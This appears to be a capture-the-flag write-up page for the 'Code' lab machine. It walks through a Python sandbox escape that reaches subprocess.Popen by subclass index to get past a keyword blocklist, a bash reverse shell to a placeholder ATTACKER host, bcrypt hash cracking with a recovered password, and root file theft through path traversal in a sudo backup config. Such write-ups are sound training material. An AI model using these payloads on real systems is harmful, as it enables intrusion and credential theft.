---
layout: default
title: "Code"
parent: Easy Machines
grand_parent: Machines
permalink: /machines/easy/code/
---

# Code

![Machine Badge](https://img.shields.io/badge/Machine-Code-blue)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)

| Property | Value |
|----------|-------|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Release** | 2025-08-02 |
| **Tags** | #python #sandbox-escape #keyword-filter #subprocess #backy #sudo |

---

## Summary

Code is a Python in-browser code editor. Dangerous keywords (e.g. `import`, `os`, `subprocess`, `exec`, `eval`, `open`, `__`) are blocklisted - but only string-based, so the **execution environment still holds dangerous objects in memory**. By walking the object graph via `().__class__.__base__.__subclasses__()` and selecting `subprocess.Popen` by **numeric index** (commonly 317), the filter is bypassed and arbitrary commands run. Post-shell, web-app SQLite holds bcrypt creds; root falls to a `sudo` rule for **`/usr/bin/backy.sh`** that allows path-traversal in the JSON config to read `/root/root.txt`.

---

## External Writeups

- [0xdf](https://0xdf.gitlab.io/2025/08/02/htb-code.html)
- [Medium - CN-0x](https://medium.com/@CN-0x/code-hackthebox-writeup-7e73abc59aee)
- [Medium - damarabrianr](https://medium.com/@damarabrianr/hackthebox-code-writeup-from-python-sandbox-escape-to-root-via-json-bypass-16d668bd307e)
- [Axura](https://4xura.com/ctf/htb-writeup-code/)
- [BugsWithBlas](https://bugswithblas.com/posts/code-htb-writeup/)

---

## Key Techniques

- Python sandbox escape via subclass enumeration
- String-based keyword blocklists are insufficient (objects remain reachable)
- `().__class__.__base__.__subclasses__()` -> `subprocess.Popen`
- Avoiding banned identifiers using index access and chained attribute lookups
- bcrypt hash cracking with `hashcat -m 3200`
- `backy` (Python backup tool) JSON config `directories_to_archive` path traversal under `sudo`

---

## Attack Path

### 1. Recon

```bash
nmap -p- --min-rate=10000 -sV -sC code.htb
# 22  ssh
# 5000  http -> Flask: Python Playground
```

### 2. Sandbox Escape

The editor filters tokens like `import`, `os`, `exec`, `eval`, `__class__`, `subprocess`, but the runtime still has every loaded class. Use list-indexing to never name a banned token:

```python
# Find subprocess.Popen index (varies; iterate or precompute)
for i, c in enumerate(().__class__.__mro__[-1].__subclasses__()):
    if c.__name__ == 'Popen': print(i)
# e.g. 317

# Bypass: avoid "__" by hex-rope construction, or wrap in getattr()
P = ().__class__.__mro__[-1].__subclasses__()[317]
P(['bash','-c','bash -i >& /dev/tcp/ATTACKER/4444 0>&1'])
```

Common variant uses chained attribute strings via `getattr`/`type` to dodge the `__` filter when it is regex-based.

Shell as `app-production`.

### 3. User Pivot

Site SQLite (`/var/www/app/instance/database.db`) holds bcrypt hashes for `martin` and others. Crack:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
# martin:nafeelswordsmaster
```

`su martin` (or SSH as `martin`).

### 4. Root via Sudo Backy

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/backy.sh /root/backy.conf
```

`backy.sh` reads the JSON config and tar-archives `directories_to_archive`. The path validation in `task.py` strips `/root` but **not** `..`:

```bash
mkdir /tmp/exf && cd /tmp/exf
cat > cfg.json <<'EOF'
{
  "destination": "/tmp/exf/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": ["/root/..//root/"]
}
EOF
sudo /usr/bin/backy.sh /tmp/exf/cfg.json
# extract /tmp/exf/code-{date}.tar.bz2 -> root.txt, /root/.ssh/id_rsa
```

---

## Lessons Learned

- Blocklist filters are bypassable; allowlists or proper sandboxes (e.g. `RestrictedPython`, gVisor, eBPF policies) are necessary.
- Once the runtime has dangerous classes, every identifier access is an attack surface - indexing, `getattr`, `__dict__` lookups all work.
- `sudo` to a script that consumes a JSON/YAML config is equivalent to `sudo` to whatever the script lets the config control.
- `..` is still the most reliable path-traversal token in 2026.
